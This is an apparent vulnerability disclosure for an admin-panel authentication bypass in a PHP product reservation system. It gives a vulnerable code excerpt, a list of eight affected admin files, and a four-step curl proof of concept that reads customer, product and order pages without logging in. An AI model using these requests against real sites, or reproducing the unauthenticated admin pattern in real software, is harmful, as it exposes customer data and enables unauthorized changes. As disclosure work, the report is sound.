# Authentication Bypass - Admin Panel Access Without Login

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)
**Download Link**: https://code-projects.org/online-product-reservation-system-in-php-with-source-code/

**Vulnerable Files**: Multiple admin panel files

**Version**: V1.0

**Description**:

Multiple administrative pages in the admin panel completely lack authentication checks, allowing unauthenticated users to access sensitive management functionality including product management, customer data, and order information.

### Analyse

**Vulnerability: Missing Authentication in Administrative Pages**

```php
// Example: handgunner-administrator/view_prod.php
<html>
<?php include('../config/config.php'); ?>
<?php include('design/head.php'); ?>
<!-- NO session_start() or authentication check! -->

<div class="wrapper">
<?php include('design/header.php'); ?>
<div class="holder">
<div class="content">
<br/>
<div>
<h3>List of Products</h3>
</div>
<br/>
<?php
// Direct database query without authentication
$id = mysql_query("SELECT * FROM products");
while($name_data=mysql_fetch_object($id)) {
    // Display all products
}
?>
```

**Affected Files**:
1. `handgunner-administrator/view_prod.php` - View all products
2. `handgunner-administrator/customer.php` - View all customer information
3. `handgunner-administrator/view_orders.php` - View all orders
4. `handgunner-administrator/order.php` - Order management
5. `handgunner-administrator/add_prod.php` - Add new products
6. `handgunner-administrator/add_category.php` - Add categories
7. `handgunner-administrator/user_reg.php` - User management
8. `handgunner-administrator/index.php` - Admin dashboard

**Vulnerability Analysis**:

1. **No Authentication**: None of these files check for valid user session
2. **No Authorization**: No role-based access control implemented
3. **Direct Access**: All administrative functions accessible via direct URL
4. **Sensitive Data Exposure**: Customer data, orders, products exposed
5. **Data Manipulation**: Unauthorized users can add/edit/delete products
6. **Complete Bypass**: Attackers can access entire admin panel without credentials

### POC

**Step 1: Access admin dashboard without login**
```bash
curl -s "http://localhost:8081/handgunner-administrator/index.php"
```

**Step 2: View all customer information**
```bash
curl -s "http://localhost:8081/handgunner-administrator/customer.php"
```

**Step 3: View all products**
```bash
curl -s "http://localhost:8081/handgunner-administrator/view_prod.php"
```

**Step 4: View all orders**
```bash
curl -s "http://localhost:8081/handgunner-administrator/view_orders.php"
```

All pages return HTTP 200 and display sensitive data without requiring authentication.

**References**:
- OWASP Broken Authentication: https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
- CWE-306: https://cwe.mitre.org/data/definitions/306.html (Missing Authentication for Critical Function)
- CWE-287: https://cwe.mitre.org/data/definitions/287.html (Improper Authentication)
